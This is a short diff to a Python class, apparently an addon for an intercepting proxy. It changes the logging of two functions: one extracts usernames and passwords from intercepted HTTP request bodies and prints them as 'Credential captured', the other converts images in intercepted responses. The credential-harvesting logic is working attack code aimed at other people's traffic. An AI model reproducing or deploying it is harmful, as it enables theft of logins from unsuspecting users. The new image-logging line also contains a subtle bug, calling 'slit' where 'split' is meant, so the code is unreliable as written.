@@ -33,9 +33,10 @@ class Trans:
         m = regex.search(flow.request.text)
         if not m:
           continue
-        print(name)
-        print('  Username: ', urllib.parse.unquote_plus(m.group('username')))
-        print('  Password: ', urllib.parse.unquote_plus(m.group('password')))
+        print('Credential captured from {}:\n\tUsername: {}\n\tPassword: {}'
+                .format(name,
+                        urllib.parse.unquote_plus(m.group('username')),
+                        urllib.parse.unquote_plus(m.group('password'))))
     except Exception as e:
       pass
 
@@ -53,7 +54,7 @@ class Trans:
       stream = io.BytesIO()
       img.save(stream, format='PNG')
       flow.response.content = stream.getvalue()
-      print('image!')
+      print('Image converted: {}'.format(flow.request.path.slit('/')[-1]))
     except Exception as e:
       repr(e)
 
